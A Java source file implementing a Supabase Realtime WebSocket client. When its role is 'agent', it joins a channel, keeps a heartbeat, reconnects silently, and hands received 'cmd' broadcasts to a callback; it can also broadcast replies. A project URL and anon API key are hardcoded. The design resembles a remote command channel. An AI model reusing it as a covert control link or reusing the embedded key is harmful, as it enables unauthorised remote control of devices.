package com.zero.agent;
import org.json.JSONObject;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
public class SupabaseRealtime {
    public static final String ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im13dnJheHRjc2xpbHlubWxna3B0Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUyMDg3NTgsImV4cCI6MjEwMDc4NDc1OH0._KeHd5TQpfCMYdSDmzpOkpbUJqzRN8B_wLFMpkYqG8A";
    public static final String WS_URL = "wss://mwvraxtcslilynmlgkpt.supabase.co/realtime/v1/websocket?apikey=" + ANON_KEY + "&vsn=1.0.0";
    public interface Callback { void onMessage(JSONObject p); }
    private OkHttpClient client = new OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build();
    private WebSocket ws; private int ref=0; private String ch, role; private Callback cb;
    public SupabaseRealtime(String ch, String role, Callback cb){this.ch=ch;this.role=role;this.cb=cb;connect();}
    private void connect(){
        Request req = new Request.Builder().url(WS_URL).build();
        ws = client.newWebSocket(req, new WebSocketListener(){
            public void onOpen(WebSocket w, Response r){
                try{JSONObject j=new JSONObject();j.put("topic","realtime:"+ch);j.put("event","phx_join");j.put("ref",String.valueOf(++ref));j.put("payload",new JSONObject());w.send(j.toString());}catch(Exception e){}
                new Thread(()->{while(true){try{Thread.sleep(25000);JSONObject h=new JSONObject();h.put("topic","phoenix");h.put("event","heartbeat");h.put("ref",String.valueOf(++ref));h.put("payload",new JSONObject());w.send(h.toString());}catch(Exception e){break;}}}).start();
            }
            public void onMessage(WebSocket w, String t){
                try{JSONObject m=new JSONObject(t);if("broadcast".equals(m.optString("event"))){JSONObject p=m.getJSONObject("payload");String ev=p.optString("event");JSONObject d=p.optJSONObject("payload");if(d==null)return;if("agent".equals(role)&&"cmd".equals(ev))cb.onMessage(d);}}catch(Exception e){}
            }
            public void onFailure(WebSocket w, Throwable t, Response r){try{Thread.sleep(5000);}catch(Exception e){}connect();}
        });
    }
    public void send(String ev, JSONObject d){
        try{JSONObject p=new JSONObject();p.put("event",ev);p.put("payload",d);p.put("type","broadcast");JSONObject e=new JSONObject();e.put("topic","realtime:"+ch);e.put("event","broadcast");e.put("ref",String.valueOf(++ref));e.put("payload",p);ws.send(e.toString());}catch(Exception e){}
    }
}